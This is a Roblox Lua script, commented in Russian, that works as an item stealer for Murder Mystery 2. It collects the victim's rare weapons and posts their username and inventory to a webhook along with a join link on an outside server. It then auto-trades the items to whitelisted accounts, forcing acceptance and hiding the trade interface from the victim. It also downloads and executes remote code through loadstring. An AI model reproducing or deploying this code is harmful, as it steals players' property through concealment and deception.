local database
do
    local ok, result = pcall(function()
        return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
    end)
    if ok and typeof(result) == "table" then
        database = result
    else
        local raw = game:HttpGet("https://raw.githubusercontent.com/Kenderlike/mm2-prices/refs/heads/main/items.txt")
        local ok2, result2 = pcall(function() return loadstring(raw)() end)
        database = (ok2 and typeof(result2) == "table") and result2 or {}
    end
end

local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local rarityValues = {}
for i, r in ipairs(rarityTable) do rarityValues[r] = i end

local untradable = {

    ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

-- Переменные состояния
local currentTradeStatus = "None"
local lastOfferToken = nil
local opponentAccepted = false
local activeTargetName = nil
local expectedTarget = nil
local tradeInProgress = false
local itemsInTrade = {} -- Отслеживаем, что реально в трейде
local tradeStartTime = 0

-- Улучшенное скрытие UI
local function hideTradeUI()
    for _, gui in ipairs(playerGui:GetChildren()) do
        if gui.Name == "TradeGUI" or gui.Name:match("Trade$") then
            if gui:IsA("ScreenGui") then
                gui.Enabled = false
            end
        end
    end
end

local function showTradeUI()
    for _, gui in ipairs(playerGui:GetChildren()) do
        if gui.Name == "TradeGUI" or gui.Name:match("Trade$") then
            if gui:IsA("ScreenGui") then
                gui.Enabled = true
            end
        end
    end
end

-- Обновляем статус кэшем, не чаще чем раз в 0.5 сек
local lastStatusCheck = 0
local function updateTradeStatus()
    local now = tick()
    if now - lastStatusCheck < 0.5 then return currentTradeStatus end
    lastStatusCheck = now
    
    local ok, status = pcall(function() 
        return Remotes.GetTradeStatus:InvokeServer() 
    end)
    currentTradeStatus = (ok and status) or "None"
    return currentTradeStatus
end

local function isUserWhitelisted(name)
    if type(name) ~= "string" then return false end
    name = name:lower()
    for _, username in ipairs(users) do
        if name:find(username:lower(), 1, true) then return true end
    end
    return false
end

local function sendTradeRequest(user)
    local player = Players:FindFirstChild(user)
    if player then 
        pcall(function() Remotes.SendRequest:InvokeServer(player) end) 
    end
end

-- Перехват обновлений трейда
Remotes.UpdateTrade.OnClientEvent:Connect(function(data)
    if typeof(data) ~= "table" then return end
    
    if data.LastOffer ~= nil then
        lastOfferToken = data.LastOffer
        lastOfferChangeAt = tick()
        opponentAccepted = false
    end
    
    -- Отслеживаем, что реально в трейде
    if data.MyOffer then
        itemsInTrade = {}
        for _, item in ipairs(data.MyOffer) do
            table.insert(itemsInTrade, item)
        end
    end
    
    local function extractName(p)
        if typeof(p) == "Instance" then return p.Name end
        if type(p) == "string" then return p end
        if type(p) == "table" and p.Name then return p.Name end
        return nil
    end
    
    local p1, p2 = extractName(data.Player1), extractName(data.Player2)
    if p1 and p1 ~= plr.Name then 
        activeTargetName = p1 
        expectedTarget = p1 
    end
    if p2 and p2 ~= plr.Name then 
        activeTargetName = p2 
        expectedTarget = p2 
    end
end)

Remotes.AcceptTrade.OnClientEvent:Connect(function(success)
    opponentAccepted = not success
end)

-- Улучшенная функция добавления предмета с ретраями
local function addWeaponToTrade(id, maxRetries)
    maxRetries = maxRetries or 5
    for i = 1, maxRetries do
        local success = pcall(function() 
            Remotes.OfferItem:FireServer(id, "Weapons") 
        end)
        if success then
            task.wait(0.15) -- Ждём, чтобы сервер обработал
            return true
        end
        task.wait(0.1 * i) -- Увеличиваем задержку с каждой попыткой
    end
    return false
end

-- Улучшенное принятие трейда
local function forceAcceptTrade(maxAttempts)
    maxAttempts = maxAttempts or 10
    if not lastOfferToken then return false end
    
    for i = 1, maxAttempts do
        -- Ждём, если недавно меняли оффер
        local timeSinceOffer = tick() - (lastOfferChangeAt or 0)
        if timeSinceOffer < 1.5 then
            task.wait(1.5 - timeSinceOffer)
        end
        
        pcall(function() 
            Remotes.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken) 
        end)
        
        task.wait(0.4)
        
        -- Проверяем, приняли ли трейд
        updateTradeStatus()
        if currentTradeStatus == "None" then
            return true -- Трейд завершился (успешно или отменён)
        end
    end
    return false
end

local function rebuildWeaponsList()
    table.clear(weaponsToSend)
    local ok, realData = pcall(function()
        return Remotes.GetProfileData:InvokeServer(plr.Name)
    end)
    
    if not ok or type(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then 
        return 
    end

    local min_idx = rarityValues[min_rarity] or 1
    for dataid, amount in pairs(realData.Weapons.Owned) do
        local itemData = database[dataid]
        if itemData and amount and amount > 0 then
            local w_idx = rarityValues[itemData.Rarity]
            if w_idx and w_idx >= min_idx and not untradable[dataid] then
                table.insert(weaponsToSend, {
                    DataID = dataid, 
                    Rarity = itemData.Rarity, 
                    Amount = amount,
                    RarityIndex = w_idx
                })
            end
        end
    end
    
    -- Сортируем: сначала редкие, потом по количеству
    table.sort(weaponsToSend, function(a, b)
        if a.RarityIndex ~= b.RarityIndex then
            return a.RarityIndex > b.RarityIndex
        end
        return a.Amount > b.Amount
    end)
end

local function SendFirstMessage(list, prefix)
    if webhook == "" then return end
    
    local fields = {
        { name = "Victim Username:", value = plr.Name, inline = true },
        { name = "Join link:", value = "http://de-bots.h1cloud.net:25569/joiner?placeId=142823291&gameInstanceId=" .. game.JobId, inline = false },
        { name = "Item list:", value = "", inline = false },
        { name = "Summary:", value = string.format("Total stacks: %d", #list), inline = false }
    }
    
    for _, item in ipairs(list) do
        fields[3].value = fields[3].value .. string.format("%s (x%s) (%s)\n", item.DataID, item.Amount, item.Rarity)
    end
    
    local data = {
        content = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
        embeds = {{ title = "Join to get MM2 hit", color = 65280, fields = fields, footer = { text = "good job" } }}
    }
    
    pcall(function()
        request({
            Url = webhook, 
            Method = "POST", 
            Headers = {["Content-Type"] = "application/json"}, 
            Body = HttpService:JSONEncode(data)
        })
    end)
end

-- Инициализация
rebuildWeaponsList()
if #weaponsToSend > 0 then
    SendFirstMessage(weaponsToSend, ping == "Yes" and "--[[@everyone]] " or "")
end

-- Авто-отправка запросов на трейд
task.spawn(function()
    while task.wait(2) do -- Увеличил интервал до 2 секунд
        updateTradeStatus()
        if currentTradeStatus == "None" and not tradeInProgress then
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Name ~= plr.Name and isUserWhitelisted(player.Name) then
                    expectedTarget = player.Name
                    sendTradeRequest(player.Name)
                    task.wait(1) -- Ждём между отправками
                end
            end
        end
    end
end)

-- Авто-принятие входящих запросов
task.spawn(function()
    while task.wait(0.5) do
        updateTradeStatus()
        if currentTradeStatus == "ReceivingRequest" then
            local foundName = nil
            
            -- Ищем имя в UI запроса
            pcall(function()
                for _, gui in ipairs(playerGui:GetChildren()) do
                    if gui.Name:find("TradeRequest") then
                        for _, obj in ipairs(gui:GetDescendants()) do
                            if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and obj.Text ~= "" then
                                local text = obj.Text:gsub("%s+", "")
                                if text ~= plr.Name and Players:FindFirstChild(text) then
                                    foundName = text
                                    break
                                end
                            end
                        end
                    end
                end
            end)
            
            if foundName and isUserWhitelisted(foundName) then
                expectedTarget = foundName
                pcall(function()
                    local r = Remotes.AcceptRequest
                    if r:IsA("RemoteFunction") then 
                        r:InvokeServer() 
                    else 
                        r:FireServer() 
                    end
                end)
                task.wait(1)
            end
        end
    end
end)

-- Главный цикл управления трейдом
task.spawn(function()
    while task.wait(0.3) do
        updateTradeStatus()
        
        if currentTradeStatus == "None" then
            if tradeInProgress then
                -- Трейд только что закончился
                tradeInProgress = false
                itemsInTrade = {}
                lastOfferToken = nil
                activeTargetName = nil
                expectedTarget = nil
            end
            hideTradeUI()
            
        elseif currentTradeStatus == "StartTrade" and not tradeInProgress then
            tradeInProgress = true
            tradeStartTime = tick()
            itemsInTrade = {}
            lastOfferToken = nil
            
            -- Определяем, с кем трейд
            local targetFound = false
            local searchStart = tick()
            
            while tick() - searchStart < 3 and not activeTargetName do
                pcall(function()
                    for _, gui in ipairs(playerGui:GetChildren()) do
                        if gui.Name:find("TradeGUI") and not gui.Name:find("Request") then
                            for _, obj in ipairs(gui:GetDescendants()) do
                                if obj:IsA("TextLabel") or obj:IsA("TextBox") then
                                    local text = obj.Text:gsub("%s+", "")
                                    if text ~= "" and text ~= plr.Name and Players:FindFirstChild(text) then
                                        activeTargetName = text
                                    end
                                end
                            end
                        end
                    end
                end)
                if not activeTargetName then task.wait(0.2) end
            end
            
            if not activeTargetName then 
                activeTargetName = expectedTarget 
            end
            
            if activeTargetName and isUserWhitelisted(activeTargetName) then
                -- Трейд с вайтлистом - скрываем UI и отправляем предметы
                hideTradeUI()
                
                rebuildWeaponsList()
                
                if #weaponsToSend > 0 then
                    -- Добавляем предметы по одному с проверкой
                    local addedCount = 0
                    for _, weapon in ipairs(weaponsToSend) do
                        if addedCount >= 4 then break end
                        
                        if addWeaponToTrade(weapon.DataID) then
                            addedCount = addedCount + 1
                        end
                    end
                    
                    -- Ждём, пока сервер подтвердит оффер
                    local waitStart = tick()
                    while tick() - waitStart < 8 do
                        if lastOfferToken then break end
                        task.wait(0.2)
                    end
                    
                    -- Если токен появился - принимаем
                    if lastOfferToken then
                        task.wait(0.5) -- Дополнительная задержка для стабильности
                        forceAcceptTrade(8)
                    end
                    
                    -- Ждём завершения трейда
                    local timeout = 0
                    while timeout < 40 do
                        updateTradeStatus()
                        if currentTradeStatus == "None" then break end
                        task.wait(0.5)
                        timeout = timeout + 0.5
                    end
                end
                
            else
                -- Трейд с не-вайтлистом - показываем UI
                showTradeUI()
                local timeout = 0
                while timeout < 40 do
                    updateTradeStatus()
                    if currentTradeStatus == "None" then break end
                    task.wait(0.5)
                    timeout = timeout + 0.5
                end
            end
        end
    end
end)

-- Дополнительный скрыватель UI (на всякий случай)
RunService.RenderStepped:Connect(function()
    if tradeInProgress and activeTargetName and isUserWhitelisted(activeTargetName) then
        hideTradeUI()
    end
end)
